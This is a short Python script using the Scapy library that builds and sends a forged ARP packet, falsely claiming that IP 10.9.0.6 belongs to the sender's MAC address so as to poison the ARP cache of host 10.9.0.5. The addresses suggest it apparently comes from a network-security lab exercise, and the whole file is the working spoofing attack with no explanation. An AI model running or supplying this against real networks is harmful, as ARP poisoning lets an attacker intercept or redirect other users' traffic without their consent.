#!/usr/bin/python3

from scapy.all import *

ether = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(hwsrc='02:42:0a:09:00:69', psrc='10.9.0.6', hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')

pkt = ether/arp
pkt.show()
sendp(pkt)
